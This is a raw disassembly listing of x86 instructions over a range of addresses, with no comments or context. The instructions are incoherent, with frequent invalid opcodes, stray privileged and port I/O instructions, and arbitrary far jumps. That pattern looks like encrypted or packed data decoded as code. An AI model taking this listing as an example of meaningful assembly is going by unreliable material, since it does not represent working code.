  42af73:	in     eax,0x15
  42af75:	ja     0x42afa2
  42af77:	sub    ah,BYTE PTR [ebx-0x26]
  42af7a:	xchg   esp,eax
  42af7b:	mov    al,ds:0x3ae39f9d
  42af80:	push   0x8c027f32
  42af85:	jbe    0x42af40
  42af87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af88:	mov    WORD PTR [ebx+0x5836dc47],es
  42af8e:	loop   0x42aff8
  42af90:	or     eax,0x87e1caa
  42af95:	mov    dl,0x7d
  42af97:	xor    eax,0x71e66d98
  42af9c:	adc    BYTE PTR [edx+ecx*8-0x63f03496],bl
  42afa3:	cld    
  42afa4:	repz popa 
  42afa6:	xor    DWORD PTR [edx+0x78],0xffffff9d
  42afaa:	pop    esi
  42afab:	xor    ebp,ebp
  42afad:	add    al,BYTE PTR [ecx+0x7971341]
  42afb3:	adc    DWORD PTR [eax],esp
  42afb5:	test   al,0x7e
  42afb7:	rol    esi,0x92
  42afba:	sar    DWORD PTR [esi+0x32],1
  42afbd:	mov    esi,DWORD PTR [edx+0x364]
	...
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0xa6b3
  42b042:	pop    ds
  42b043:	mov    cl,0x68
  42b045:	mov    DWORD PTR [ecx],0xf500
  42b04b:	add    ah,cl
  42b04d:	int3   
  42b04e:	inc    ebp
  42b04f:	mov    ebx,0x9219477f
  42b054:	dec    ecx
  42b055:	mov    eax,ds:0xb616b359
  42b05a:	push   cs
  42b05b:	sbb    al,0x36
  42b05d:	out    0x12,al
  42b05f:	fstp   DWORD PTR [eax-0x1c]
  42b062:	mov    eax,0x27b87d06
  42b067:	mov    esp,0xd72f5a3f
  42b06c:	dec    esi
  42b06d:	mov    ds:0x3e357e6d,al
  42b072:	repz jb 0x42b08b
  42b075:	test   BYTE PTR [edi+0x4a6eb5a1],0xdc
  42b07c:	es mov edi,0x531e5842
  42b082:	mov    ds:0x67e850c0,eax
  42b087:	pop    es
  42b088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b089:	lahf   
  42b08a:	xchg   ebp,eax
  42b08b:	ins    DWORD PTR es:[edi],dx
  42b08c:	dec    esi
  42b08d:	loope  0x42b010
  42b08f:	out    dx,al
  42b090:	mov    al,ds:0x3b28ec02
  42b095:	add    BYTE PTR [ebx+0xb721759],cl
  42b09b:	or     esi,ecx
  42b09d:	repnz push edx
  42b09f:	mov    cl,0x59
  42b0a1:	test   eax,0x514e25f9
  42b0a6:	jecxz  0x42b112
  42b0a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0a9:	xchg   edx,eax
  42b0aa:	(bad)  
  42b0ac:	fisub  DWORD PTR [esi-0x32e78e10]
  42b0b2:	loopne 0x42b0a9
  42b0b4:	xor    dh,BYTE PTR [eax+0x207ecacb]
  42b0ba:	jp     0x42b123
  42b0bc:	cli    
  42b0bd:	pop    bx
  42b0bf:	or     al,0xd
  42b0c1:	(bad)  
  42b0c2:	popa   
  42b0c3:	cmp    dl,BYTE PTR [ebp+0x3ef023cd]
  42b0c9:	jmp    0x37f5:0x3ce3f5ca
  42b0d0:	sub    eax,ebx
  42b0d2:	inc    ebx
  42b0d3:	gs jge 0x42b062
  42b0d6:	adc    cl,BYTE PTR [ebx-0x25]
  42b0d9:	ror    DWORD PTR ds:0xbb1c2464,0x5d
  42b0e0:	bound  esp,QWORD PTR [ebx+ebp*4-0x6d]
  42b0e4:	and    BYTE PTR fs:[ebx-0x53],cl
  42b0e8:	xor    eax,0x97bfdda4
  42b0ed:	ret    
  42b0ee:	into   
  42b0ef:	idiv   DWORD PTR gs:[edi*1-0xb908111]
  42b0f7:	out    dx,al
  42b0f8:	fmul   QWORD PTR [eax-0x5b79d510]
  42b0fe:	dec    eax
  42b0ff:	cld    
  42b100:	popa   
  42b101:	sbb    ebx,edx
  42b103:	aad    0xf2
  42b105:	dec    ebx
  42b106:	xchg   BYTE PTR [edx+0x26],dl
  42b109:	cmp    DWORD PTR [ecx-0xa],esi
  42b10c:	ret    
  42b10d:	mov    cl,0x37
  42b10f:	cld    
  42b110:	stos   DWORD PTR es:[edi],eax
  42b111:	outs   dx,BYTE PTR ds:[esi]
  42b112:	mov    eax,0xff4f05bb
  42b117:	sti    
  42b118:	cmp    edi,ebx
  42b11a:	js     0x42b15e
  42b11c:	mov    ch,BYTE PTR [ebx]
  42b11e:	ds sub eax,0xf2fcd6f7
  42b124:	shr    BYTE PTR [esi-0x44128d01],0xd8
  42b12b:	(bad)  
  42b12d:	cld    
  42b12e:	jae    0x42b0be
  42b130:	stos   BYTE PTR es:[edi],al
  42b131:	aam    0xe4
  42b133:	(bad)  
  42b134:	sti    
  42b135:	fidivr WORD PTR [ecx-0x353899dd]
  42b13b:	cwde   
  42b13c:	loop   0x42b1bd
  42b13e:	loope  0x42b0c8
  42b140:	test   al,0x0
	...
  42b1b2:	add    BYTE PTR [eax],al
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	mov    eax,ds:0x5de6fc70
  42b1c5:	enter  0x1,0xf5
  42b1c9:	add    BYTE PTR [eax],al
  42b1cb:	add    dl,ah
  42b1cd:	ror    BYTE PTR [ebx],1
  42b1cf:	adc    ebp,ebx
  42b1d1:	and    eax,0xd824e704
  42b1d6:	inc    eax
  42b1d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1d8:	(bad)  
  42b1da:	mov    dl,0x51
  42b1dc:	js     0x42b21e
  42b1de:	stos   DWORD PTR es:[edi],eax
  42b1df:	cmc    
  42b1e0:	cmp    BYTE PTR [eax+0x508bd18f],ah
  42b1e6:	or     al,0xff
  42b1e8:	adc    DWORD PTR [ebp-0x17],0xffffffc3
  42b1ec:	mov    edi,0x4df99cc2
  42b1f1:	ret    
  42b1f2:	push   es
  42b1f3:	jno    0x42b1dc
  42b1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1f6:	push   es
  42b1f7:	xchg   edi,eax
  42b1f8:	pop    eax
  42b1f9:	add    ebx,ebx
  42b1fb:	jle    0x42b1b2
  42b1fd:	fisubr DWORD PTR [eax+0x170bb973]
  42b203:	mov    edx,0xcd425a6b
  42b208:	fimul  WORD PTR ds:0x200f10f3
  42b20e:	mov    dh,0xb5
  42b210:	cld    
  42b211:	dec    ebp
  42b212:	jle    0x42b1c5
  42b214:	fsubr  QWORD PTR [ebp-0x62c2d052]
  42b21a:	stc    
  42b21b:	dec    esp
  42b21c:	add    DWORD PTR ds:0x646859ac,0x323d9791
  42b226:	das    
  42b227:	or     eax,0x3bdb7a2e
  42b22c:	shl    BYTE PTR [ebx],0x10
  42b22f:	mov    DWORD PTR [edi],edi
  42b231:	jo     0x42b2af
  42b233:	dec    esp
  42b234:	and    DWORD PTR [eax+0x18],0x33
  42b238:	scas   eax,DWORD PTR es:[edi]
  42b239:	cmp    ecx,esp
  42b23b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b23c:	and    bl,BYTE PTR [edx+0x3b]
  42b23f:	leave  
  42b240:	mov    eax,0xcd2b21db
  42b245:	or     al,0x72
  42b247:	push   0xb2d6bb11
  42b24c:	mov    ch,0xd5
  42b24e:	xchg   esp,eax
  42b24f:	jne    0x42b241
  42b251:	and    BYTE PTR [edi+0x1ad25675],bh
  42b257:	mov    ah,0xe2
  42b259:	sub    dl,BYTE PTR [ebp+0x55]
  42b25c:	push   edi
  42b25d:	pop    ss
  42b25e:	call   0x86811592
  42b263:	xchg   DWORD PTR [edi],esi
  42b265:	imul   ecx,DWORD PTR ds:0x37d99c99,0x721facc4
  42b26f:	or     ebp,edx
  42b271:	dec    esp
  42b272:	lods   eax,DWORD PTR ds:[esi]
  42b273:	add    eax,0x7d9d65aa
  42b278:	xchg   DWORD PTR [esi-0x255515a7],esp
  42b27e:	inc    eax
  42b27f:	mov    bh,0x19
  42b281:	or     cl,BYTE PTR [edx-0x4e]
  42b284:	aam    0x11
  42b286:	pop    ebx
  42b287:	sbb    DWORD PTR [edi],0x52
  42b28a:	pop    esp
  42b28b:	imul   esi,ecx,0x84dd3e48
  42b291:	push   cs
  42b292:	mov    eax,ds:0x7ed454e4
  42b297:	stos   DWORD PTR es:[edi],eax
  42b298:	sub    eax,0xd50b8c7d
  42b29d:	and    DWORD PTR [ecx+0x78],esi
  42b2a0:	push   edi
  42b2a1:	popf   
  42b2a2:	(bad)  
  42b2a4:	mov    esi,0x88c3cfe6
  42b2a9:	or     edx,DWORD PTR ds:0xab3b788a
  42b2af:	or     ebp,DWORD PTR [edx]
  42b2b1:	adc    ah,BYTE PTR [edx]
  42b2b3:	icebp  
  42b2b4:	mov    ds:0xdd912425,al
  42b2b9:	rol    ebp,cl
  42b2bb:	int3   
  42b2bc:	xchg   ecx,eax
  42b2bd:	and    edx,DWORD PTR [ebp-0x58]
  42b2c0:	iret   
	...
  42b331:	add    BYTE PTR [eax],al
  42b333:	add    BYTE PTR [edi+0xe],bh
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax-0x30],esi
  42b341:	repz call 0x20c05b1
  42b347:	add    ch,dh
  42b349:	add    BYTE PTR [eax],al
  42b34b:	add    BYTE PTR [esi],ah
  42b34d:	and    eax,0x12db0aba
  42b352:	dec    ebp
  42b353:	mov    ds:0x6c015044,eax
  42b358:	ds shl ecx,cl
  42b35b:	jge    0x42b3d4
  42b35d:	mov    edx,0x4c4d5506
  42b362:	fldcw  WORD PTR [eax+0x23599b92]
  42b368:	ret    
  42b369:	aas    
  42b36a:	jp     0x42b317
  42b36c:	dec    edi
  42b36d:	hlt    
  42b36e:	jns    0x42b308
  42b370:	xor    BYTE PTR [esi-0x44],bh
  42b373:	mov    ds:0x93d3c029,eax
  42b378:	and    bl,dl
  42b37a:	mov    ds:0x74b66c71,al
  42b37f:	ins    BYTE PTR es:[edi],dx
  42b380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b381:	inc    edx
  42b382:	pop    ebp
  42b383:	das    
  42b384:	push   ebp
  42b385:	test   eax,0x96cd58ba
  42b38a:	mov    bl,0x87
  42b38c:	ds mov edx,0x2b919c43
  42b392:	sub    cl,dh
  42b394:	outs   dx,BYTE PTR ds:[esi]
  42b395:	sti    
  42b396:	pop    es
  42b397:	bound  esi,QWORD PTR [ebp+ecx*2+0x6b83e68f]
  42b39e:	fstp   TBYTE PTR [ecx+0x36]
  42b3a1:	inc    eax
  42b3a2:	es xor ah,dh
  42b3a5:	or     ah,BYTE PTR [edi]
  42b3a7:	push   edx
  42b3a8:	daa    
  42b3a9:	jbe    0x42b35d
  42b3ab:	idiv   ch
  42b3ad:	mov    edx,edx
  42b3af:	jnp    0x42b3b3
  42b3b1:	jmp    0x7c06:0xd1bc8958
  42b3b8:	outs   dx,BYTE PTR ds:[esi]
  42b3b9:	fwait
  42b3ba:	and    BYTE PTR [ebx+0x4a5df2ef],dh
  42b3c0:	mov    BYTE PTR [ebp-0x1500e955],dh
  42b3c6:	pop    eax
  42b3c7:	dec    ebp
  42b3c8:	adc    eax,0x92d25bac
  42b3cd:	inc    edx
  42b3ce:	popa   
  42b3cf:	stos   BYTE PTR es:[edi],al
  42b3d0:	test   al,0x9f
  42b3d2:	or     cl,bh
  42b3d4:	xchg   ebx,eax
  42b3d5:	xor    eax,0x468afc81
  42b3da:	idiv   BYTE PTR [eax+0x1b7d72d]
  42b3e0:	push   ds
  42b3e1:	stos   DWORD PTR es:[edi],eax
  42b3e2:	jmp    0x42b3f4
  42b3e4:	or     dh,cl
  42b3e6:	cmovae esp,ebp
  42b3e9:	call   0x21c8:0x39565663
  42b3f0:	(bad)  
  42b3f1:	data16 into 
  42b3f3:	sbb    al,0x7d
  42b3f5:	push   eax
  42b3f6:	(bad)
  42b3f9:	dec    ecx
  42b3fa:	ja     0x42b420
  42b3fc:	mov    ch,0xc7
  42b3fe:	and    esp,DWORD PTR [esi+0x1b5441d]
  42b404:	xchg   esp,eax
  42b405:	out    0x15,al
  42b407:	inc    ecx
  42b408:	and    al,0x5f
  42b40a:	inc    esp
  42b40b:	pop    edx
  42b40c:	ins    BYTE PTR es:[edi],dx
  42b40d:	vpcmpb k7{k1}{z},ymm4,YMMWORD PTR [ebx],0x18
  42b414:	icebp  
  42b415:	mov    dl,BYTE PTR [ebp+edi*2+0x38]
  42b419:	js     0x42b496
  42b41b:	ficom  WORD PTR [esi-0x3c4fd7d7]
  42b421:	test   DWORD PTR ds:0xfcd502b1,ecx
  42b427:	mov    dh,0x10
  42b429:	push   cs
  42b42a:	sbb    dh,BYTE PTR [eax+0x20a70111]
  42b430:	ss push edi
  42b432:	cli    
  42b433:	add    al,0xb7
  42b435:	sbb    al,0x41
  42b437:	hlt    
  42b438:	push   eax
  42b439:	rol    edi,0x48
  42b43c:	std    
  42b43d:	jbe    0x42b3d6
  42b43f:	icebp  
  42b440:	mov    esi,0x0
	...
  42b4b1:	add    BYTE PTR [eax],al
  42b4b3:	add    BYTE PTR [eax],bl
  42b4b5:	dec    edi
  42b4b6:	pop    ss
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	push   edx
  42b4c1:	outs   dx,DWORD PTR ds:[esi]
  42b4c2:	dec    esi
  42b4c3:	jnp    0x42b50c
  42b4c5:	retf   0x1
  42b4c8:	cmc    
  42b4c9:	add    BYTE PTR [eax],al
  42b4cb:	add    BYTE PTR [ecx+esi*1-0x1d1b643c],ah
  42b4d2:	push   ds
  42b4d3:	stos   DWORD PTR es:[edi],eax
  42b4d4:	sub    BYTE PTR [ecx+0x7a],0xc1
  42b4d8:	les    esp,FWORD PTR [ecx-0x585dcbe4]
  42b4de:	mov    cl,BYTE PTR [ebx-0x5d902a0c]
  42b4e4:	adc    DWORD PTR [ebp-0x69],0xbd6ab304
  42b4eb:	shl    BYTE PTR [edx],cl
  42b4ed:	xchg   esp,eax
  42b4ee:	mov    esi,0xecffd85f
  42b4f3:	int    0x13
  42b4f5:	cmp    eax,0x2b875692
  42b4fa:	rcl    DWORD PTR [esi+ebx*1-0x44],0xbe
  42b4ff:	in     eax,0x72
  42b501:	sbb    eax,0xa2baa01e
  42b506:	pop    edi
  42b507:	dec    ebx
  42b508:	lods   al,BYTE PTR ds:[esi]
  42b509:	mov    bh,0x8d
  42b50b:	outs   dx,DWORD PTR ds:[esi]
  42b50c:	mov    ds,WORD PTR [edi]
  42b50e:	jb     0x42b4e5
  42b510:	fcmovne st,st(4)
  42b512:	call   0x32752a09
  42b517:	mov    al,0x2e
  42b519:	push   0xffffff88
  42b51b:	mov    ds:0x409bcbf1,al
  42b520:	inc    eax
  42b521:	pop    eax
  42b522:	pusha  
  42b523:	loope  0x42b5a1
  42b525:	jb     0x42b528
  42b527:	hlt    
  42b528:	out    0xdb,al
  42b52a:	xchg   edx,eax
  42b52b:	pop    esi
  42b52c:	into   
  42b52d:	das    
  42b52e:	inc    esp
  42b52f:	xor    al,0xb5
  42b531:	push   edx
  42b532:	daa    
  42b533:	test   al,0x15
  42b535:	jge    0x42b500
  42b537:	dec    eax
  42b538:	or     dh,BYTE PTR [edx]
  42b53a:	dec    edi
  42b53b:	es test ebx,edx
  42b53e:	leave  
  42b53f:	sbb    eax,0x759ad890
  42b544:	fldenv [esp+ecx*1-0x2df03c7c]
  42b54b:	in     eax,0x12
  42b54d:	neg    DWORD PTR [edi+0x41]
  42b550:	xchg   ebx,eax
  42b551:	mov    DWORD PTR [ebx-0x777095af],0x5b8b87e6
  42b55b:	mov    eax,ds:0x8a91cc41
  42b560:	mov    DWORD PTR [edi],ebx
  42b562:	inc    esp
  42b563:	clc    
  42b564:	mov    ecx,0xb8bd4c5f
  42b569:	xchg   BYTE PTR [ebp-0x33cf8db4],al
  42b56f:	adc    al,BYTE PTR fs:[esi-0x72]
  42b573:	aad    0x7d
  42b575:	jecxz  0x42b5e5
  42b577:	lods   eax,DWORD PTR ds:[esi]
  42b578:	inc    eax
  42b579:	add    esp,DWORD PTR [ecx+0x161fa405]
  42b57f:	stc    
  42b580:	dec    esi
  42b581:	int    0xcb
  42b583:	sbb    al,0x4f
  42b585:	pop    esp
  42b586:	dec    edi
  42b587:	mov    cl,0x41
  42b589:	dec    ecx
  42b58a:	stos   DWORD PTR es:[edi],eax
  42b58b:	cld    
  42b58c:	jmp    0x42b55b
  42b58e:	ss xchg edx,eax
  42b590:	adc    eax,0xd9c2b95c
  42b595:	xor    BYTE PTR [ebp+0x54ce0cce],dl
  42b59b:	mov    al,ds:0x3ff22be7
  42b5a0:	mov    edi,0x34c96ed7
  42b5a5:	sbb    edx,DWORD PTR [ebp+0x1032dc02]
  42b5ab:	mov    edx,0xdc28c435
  42b5b0:	sbb    bh,BYTE PTR [esi-0x79b3dca7]
  42b5b6:	data16 fs aad 0xc0
  42b5ba:	adc    bh,dl
  42b5bc:	sbb    BYTE PTR [edx+0x50d933],dl
	...
  42b632:	add    BYTE PTR [eax],al
  42b634:	and    al,0x16
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    bh,cl
  42b641:	sbb    dl,cl
  42b643:	imul   edi,DWORD PTR [ebx+ecx*8],0xf50001
  42b64a:	add    BYTE PTR [eax],al
  42b64c:	scas   al,BYTE PTR es:[edi]
  42b64d:	or     al,BYTE PTR [edi-0x44afea68]
  42b653:	loop   0x42b654
  42b655:	(bad)  
  42b656:	in     al,0x48
  42b658:	(bad)  
  42b659:	sub    eax,0xda9842c1
  42b65e:	dec    ebx
  42b65f:	pop    edi
  42b660:	or     DWORD PTR [ecx],eax
  42b662:	sub    dl,BYTE PTR [eax]
  42b664:	daa    
  42b665:	sahf   
  42b666:	popa   
  42b667:	jmp    0xeec1d75b
  42b66c:	mov    ebp,0xf87c4dc7
  42b671:	xchg   esp,eax
  42b672:	sub    DWORD PTR [ecx],esp
  42b674:	inc    esi
  42b675:	jp     0x42b61a
  42b677:	jg     0x42b6e2
  42b679:	xchg   ebx,eax
  42b67a:	ds jnp 0x42b694
  42b67d:	xor    BYTE PTR [ecx-0x38641b5a],dl
  42b683:	loopne 0x42b645
  42b685:	and    eax,0x1f451ad8
  42b68a:	cmp    DWORD PTR [ecx-0x9],esi
  42b68d:	add    DWORD PTR ds:0xdd2985a6,0xffffff91
  42b694:	xchg   esp,eax
  42b695:	push   esi
  42b696:	mov    ebp,0x9d848d41
  42b69b:	xchg   ecx,eax
  42b69c:	mov    edx,0x8d19037d
  42b6a1:	je     0x42b6f8
  42b6a3:	int3   
  42b6a4:	sbb    al,0x4d
  42b6a6:	xchg   esp,eax
  42b6a7:	out    dx,al
  42b6a8:	add    edx,DWORD PTR [eax]
  42b6aa:	pop    es
  42b6ab:	push   esi
  42b6ac:	adc    edi,DWORD PTR [edi+0xbe979e]
  42b6b2:	js     0x42b70e
  42b6b4:	gs inc esp
  42b6b6:	inc    edi
  42b6b7:	push   esp
  42b6b8:	pushf  
  42b6b9:	or     al,0xf9
  42b6bb:	jnp    0x42b6b3
  42b6bd:	or     BYTE PTR [ecx-0x41],bh
  42b6c0:	cwde   
  42b6c1:	xor    BYTE PTR [ecx-0x60],dh
  42b6c4:	inc    esi
  42b6c5:	leave  
  42b6c6:	aam    0x9c
  42b6c8:	int    0xcc
  42b6ca:	mov    cl,0x95
  42b6cc:	sub    BYTE PTR [edx+edi*2],0x11
  42b6d0:	test   eax,0x34682803
  42b6d5:	outs   dx,BYTE PTR ds:[esi]
  42b6d6:	ret    0x9bb0
  42b6d9:	call   0x739156f5
  42b6de:	jb     0x42b751
  42b6e0:	xchg   DWORD PTR [ebp-0x5d],esp
  42b6e3:	mov    dh,0xec
  42b6e5:	lds    ecx,FWORD PTR ds:0x65078dc5
  42b6eb:	imul   ecx,DWORD PTR [eax],0xe7b6dec4
  42b6f1:	inc    ecx
  42b6f2:	jmp    0x42b6f0
  42b6f4:	jle    0x42b6c2
  42b6f6:	jo     0x42b682
  42b6f8:	ret    
  42b6f9:	fsubr  st(6),st
  42b6fb:	iret   
  42b6fc:	mov    ah,0x25
  42b6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6ff:	mov    ah,0xf4
  42b701:	push   esp
  42b702:	lds    esi,FWORD PTR [edi+0x5cf6d1e0]
  42b708:	jmp    0xe8ed:0x8e6b4825
  42b70f:	scas   eax,DWORD PTR es:[edi]
  42b710:	mov    ds:0x10397b96,eax
  42b715:	cmp    DWORD PTR [ecx],ecx
  42b717:	call   FWORD PTR ds:0x8b9b54e5
  42b71d:	ror    DWORD PTR [ecx],0x5f
  42b720:	push   edi
  42b721:	pop    ecx
  42b722:	ss cmp ch,bh
  42b725:	gs aam 0x4c
  42b728:	jne    0x42b70f
  42b72a:	inc    esi
  42b72b:	rcl    edx,1
  42b72d:	mov    ch,0x2c
  42b72f:	add    DWORD PTR [edi+esi*2-0x3ea7f01b],ecx
  42b736:	add    eax,0x9f347bb
  42b73b:	xor    edx,eax
  42b73d:	(bad)  
  42b73e:	fidivr DWORD PTR [ecx+0x97]
	...
  42b7b4:	mov    ah,BYTE PTR [ebp+0x63]
  42b7b7:	mov    edi,0x75debfef
  42b7bc:	push   0xffffff98
  42b7be:	xor    eax,0x54d1dafb
  42b7c3:	outs   dx,DWORD PTR ds:[esi]
  42b7c4:	xor    esp,ecx
  42b7c6:	add    DWORD PTR [eax],eax
  42b7c8:	cmc    
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    BYTE PTR [eax],bh
  42b7cd:	in     al,0xb0
  42b7cf:	mov    ebx,0x300c7e23
  42b7d4:	(bad)  
  42b7d5:	mov    bh,0x56
  42b7d7:	push   edi
  42b7d8:	arpl   di,bp
  42b7da:	dec    edi
  42b7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7dc:	xchg   esi,eax
  42b7dd:	cld    
  42b7de:	jecxz  0x42b7be
  42b7e0:	mov    ds:0x63d5b8f8,al
  42b7e5:	and    bh,BYTE PTR [esi-0x5e37f98e]
  42b7eb:	pop    edx
  42b7ec:	or     DWORD PTR [ebx],eax
  42b7ee:	ror    DWORD PTR [edx-0x538a5344],0x42
  42b7f5:	xchg   ebp,eax
  42b7f6:	adc    BYTE PTR [ebp+0x1e],0xf
  42b7fa:	sub    esp,DWORD PTR [ebx+0x4e9a55ba]
  42b800:	pop    esi
  42b801:	into   
  42b802:	lds    ecx,FWORD PTR [edi]
  42b804:	or     BYTE PTR [edx],ch
  42b806:	ins    DWORD PTR es:[edi],dx
  42b807:	scas   eax,DWORD PTR es:[edi]
  42b808:	aas    
  42b809:	sbb    eax,0x105ff407
  42b80e:	repz push ss
  42b810:	std    
  42b811:	cmp    al,0xa0
  42b813:	add    al,0xe2
  42b815:	pop    es
  42b816:	lea    bp,[eax+0x46]
  42b81a:	lods   al,BYTE PTR ds:[esi]
  42b81b:	test   esp,ebp
  42b81d:	cs leave 
  42b81f:	lods   eax,DWORD PTR ds:[esi]
  42b820:	sbb    bh,BYTE PTR [esi+0x70605f9f]
  42b826:	sbb    BYTE PTR [ebx+0x6897988a],ch
  42b82c:	and    ah,BYTE PTR [ebp+0x4d60d7e6]
  42b832:	shl    DWORD PTR [esp+ebp*4-0x4a],0x19
  42b837:	fwait
  42b838:	clc    
  42b839:	mov    BYTE PTR [esi-0x5b],bh
  42b83c:	iret   
  42b83d:	imul   esi,ebx,0xf3b41dcf
  42b843:	imul   edi,DWORD PTR [edx+edi*4-0x17],0x5c04e08e
  42b84b:	(bad)  
  42b84c:	adc    BYTE PTR [ebp+0x27],dh
  42b84f:	sbb    DWORD PTR [ebp+0x68d8f517],esp
  42b855:	xchg   ebx,eax
  42b856:	loop   0x42b815
  42b858:	add    dl,BYTE PTR [eax]
  42b85a:	mov    edx,0x4149bcf1
  42b85f:	sub    al,0x4
  42b861:	jle    0x42b8b9
  42b863:	test   al,0xa3
  42b865:	xchg   esp,eax
  42b866:	retf   
  42b867:	(bad)  
  42b868:	out    0xb4,eax
  42b86a:	es add eax,0x51347efd
  42b870:	inc    eax
  42b871:	inc    edi
  42b872:	fsubr  QWORD PTR [eax+0x5869681b]
  42b878:	sub    eax,0x2c9ae6fe
  42b87d:	xchg   edi,eax
  42b87e:	cmp    ebp,DWORD PTR [eax]
  42b880:	nop
  42b881:	fnstcw WORD PTR fs:[ecx-0x5d4b075e]
  42b888:	mov    edi,0xabcf0ecb
  42b88d:	jge    0x42b84b
  42b88f:	es inc ecx
  42b891:	sub    al,0xb2
  42b893:	xor    ebp,0x78
  42b896:	fidivr DWORD PTR [edx+0x5b]
  42b899:	in     eax,0x6c
  42b89b:	popa   
  42b89c:	jge    0x42b86e
  42b89e:	repz mov ebx,0x6251a61
  42b8a4:	mov    eax,ds:0xbb0ed227
  42b8a9:	mov    edi,0xa6c74936
  42b8ae:	push   esp
  42b8af:	jbe    0x42b849
  42b8b1:	loope  0x42b85e
  42b8b3:	loope  0x42b8e4
  42b8b5:	int    0xdd
  42b8b7:	daa    
  42b8b8:	out    0x7e,al
  42b8ba:	sbb    edi,DWORD PTR [edi]
  42b8bc:	inc    eax
  42b8bd:	ins    BYTE PTR es:[edi],dx
  42b8be:	sbb    dh,BYTE PTR [ebp+0xbc]
	...
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	xchg   ebp,eax
  42b941:	fldenv [esi+edi*8+0x26]
  42b945:	int    0x1
  42b947:	add    ch,dh
  42b949:	add    BYTE PTR [eax],al
  42b94b:	add    BYTE PTR [ebx],bl
  42b94d:	mov    ecx,0x7c5ca9e
  42b952:	jmp    0x2691:0xed9a212
  42b959:	pop    ecx
  42b95a:	adc    bh,BYTE PTR [edx+0x76]
  42b95d:	push   edx
  42b95e:	jbe    0x42b9b7
  42b960:	outs   dx,DWORD PTR ds:[esi]
  42b961:	dec    ecx
  42b962:	dec    esp
  42b963:	xlat   BYTE PTR ds:[ebx]
  42b964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b965:	and    eax,0x1e557cf4
  42b96a:	xor    BYTE PTR [ebp+0x45dac05b],bh
  42b970:	and    esp,edx
  42b972:	(bad)  
  42b973:	xor    BYTE PTR [ecx+0x11],dh
  42b976:	add    eax,0x4bbd92d7
  42b97b:	sbb    ecx,ebx
  42b97d:	nop
  42b97e:	sub    bh,0x63
  42b981:	mov    ecx,0x1fb9ccb0
  42b986:	stc    
  42b987:	push   esp
  42b988:	jl     0x42b976
  42b98a:	mov    edi,0xf0b6b31e
  42b98f:	mov    DWORD PTR [esi+0x7a014a8d],ecx
  42b995:	push   0x3c9a2194
  42b99a:	cmp    BYTE PTR [ebx-0x5a6fa71e],ch
  42b9a0:	jmp    0x6a55b6bc
  42b9a5:	mov    ss,ebx
  42b9a7:	mov    esp,0x81de3de1
  42b9ac:	leave  
  42b9ad:	cwde   
  42b9ae:	repz popf 
  42b9b0:	pop    esi
  42b9b1:	cli    
  42b9b2:	js     0x42ba24
  42b9b4:	aaa    
  42b9b5:	sbb    eax,0x648b8cce
  42b9ba:	lahf   
  42b9bb:	jg     0x42b9d3
  42b9bd:	lods   eax,DWORD PTR ds:[esi]
  42b9be:	add    al,0x89
  42b9c0:	sbb    DWORD PTR [ebx-0x49],eax
  42b9c3:	call   0x4fceb826
  42b9c8:	jmp    DWORD PTR [ebx-0xe87ffc4]
  42b9ce:	push   edx
  42b9cf:	jne    0x42b982
  42b9d1:	sbb    eax,0x89712c75
  42b9d6:	call   0x4fbb:0x627e56e
  42b9dd:	jmp    0x42ba54
  42b9df:	pop    esp
  42b9e0:	test   DWORD PTR ds:[eax],ecx
  42b9e3:	sbb    eax,0xffe844d2
  42b9e8:	mov    BYTE PTR [edx+0x46],ch
  42b9eb:	inc    eax
  42b9ec:	pop    edi
  42b9ed:	ret    
  42b9ee:	sahf   
  42b9ef:	mov    ebp,DWORD PTR [eax]
  42b9f1:	push   eax
  42b9f2:	cli    
  42b9f3:	or     ebx,edx
  42b9f5:	dec    ebp
  42b9f6:	and    cl,ch
  42b9f8:	fwait
  42b9f9:	add    DWORD PTR [ebp+0x7a],ecx
  42b9fc:	clc    
  42b9fd:	xchg   ebx,eax
  42b9fe:	addr16 (bad) 
  42ba00:	xor    ecx,DWORD PTR [edx+eiz*8-0x717b4b8e]
  42ba07:	popa   
  42ba08:	fwait
  42ba09:	rol    DWORD PTR [edi+0x7676f3de],1
  42ba0f:	add    esp,edi
  42ba11:	arpl   bx,bx
  42ba13:	xor    BYTE PTR [ecx-0xf],dl
  42ba16:	sub    DWORD PTR [ebx],eax
  42ba18:	test   al,0xd5
  42ba1a:	fsubrp st(0),st
  42ba1c:	pop    edi
  42ba1d:	inc    edi
  42ba1e:	jb     0x42ba47
  42ba20:	fisttp QWORD PTR [ebp-0x2c]
  42ba23:	ret    0xe9dc
  42ba26:	scas   al,BYTE PTR es:[edi]
  42ba27:	pushf  
